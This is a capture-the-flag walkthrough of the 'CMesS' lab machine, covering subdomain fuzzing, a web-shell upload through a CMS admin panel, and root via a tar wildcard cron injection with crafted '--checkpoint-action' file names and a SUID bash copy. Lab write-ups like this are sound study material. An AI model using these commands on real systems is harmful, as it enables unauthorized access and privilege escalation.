First of all we need to put the domain in our `/etc/hosts` file:
```text
HOST_IP cmess.thm
```
- ![[Pasted image 20250117164004.png]]


# Nmap scan
First of all we need to do a `NMAP` scan:
```bash
nmap -A -p- HOST_IP
```
- ![[Pasted image 20250117164045.png]]
- we can see there is a `http` server on port `80`


# Navigate and enumerate the web server

We start to enumerate the website:
- ![[Pasted image 20250117164134.png]]

We use `dirbuster` and we find a `/admin` page.


We connect to it:
- ![[Pasted image 20250117164305.png]]
- But nothing interesting


# Enumerating subdomains

To do that we use `wfuzz`:
```bash
wfuzz -c-f sub-fighter -w top5000.txt -u 'http://cmess.htm' -H "Hosh: FUZZ.cmess.thm"
```
- we can find the wordlist here [https://github.com/danielmiessler/SecLists/blob/master/Discovery/DNS/subdomains-top1million-5000.txt](https://github.com/danielmiessler/SecLists/blob/master/Discovery/DNS/subdomains-top1million-5000.txt)
- ![[Pasted image 20250117164632.png]]

A lot of results so we filter on size `290` them:
```bash
wfuzz -c-f sub-fighter -w top5000.txt -u 'http://cmess.htm' -H "Hosh: FUZZ.cmess.thm" -hw 290
```
- ![[Pasted image 20250117164753.png]]
- we found `dev`

We add it into the `/etc/hosts`:
- ![[Pasted image 20250117164825.png]]

At this point we visit it and we get:
- ![[Pasted image 20250117164851.png]]
- a password and the username `andre`




So we go on `/admin` and we login as `andre:passfound`:
- ![[Pasted image 20250117164948.png]]

# File upload
In the content section we can upload files:
- ![[Pasted image 20250117165040.png]]
- ![[Pasted image 20250117165030.png]]


We can see that `.phtlm` is allowed.


So we visit `cmess.htm/assets/shell.phtml` and the shell pops out:
- ![[Pasted image 20250117165219.png]]


# Privilege escalation
So we download in it `linpeas` and `linenum.sh`

We make them executable:
```bash
chmod +x linenum.sh
```

And we run it:
```bash
./linenum.sh
```


It shows us the crons:
- ![[Pasted image 20250117165457.png]]
	- we have a wildcard!
- ![[Pasted image 20250117165542.png]]
	- we can also see a backup of passwords on which we have all permissions

So we read the backup file:
```bash
cat /opt/.password.bak
```
- ![[Pasted image 20250117165634.png]]

So at this point we access with `ssh` to be more stable on the machine:
```bash
ssh andre@HOST_IP
```
- ![[Pasted image 20250117165737.png]]


## cron wildcards
So now we try to escalate with the wildcard in cron:
```bash
cat /etc/crontab
```
- ![[Pasted image 20250117165829.png]]

So we just need to do:
```bash
echo 'cp /bin/bash /tmp/bash; chmod +s /tmp/bash' > /home/andre/backup/shell.sh
```
-  since the script is executed there


Now we generate the checkpoints:
```bash
touch /home/andre/backup/--checkpoint=1

touch /home/andre/backup/--checkpoint-action=exec=sh\shell.sh
```


After a while we can see in `/tmp`:
- ![[Pasted image 20250117170134.png]]

Now we just need to run it:
```bash
/tmp/bash -p
```
- ![[Pasted image 20250117170202.png]]


<mark style="background: #BBFABBA6;">We gain root shell!</mark>

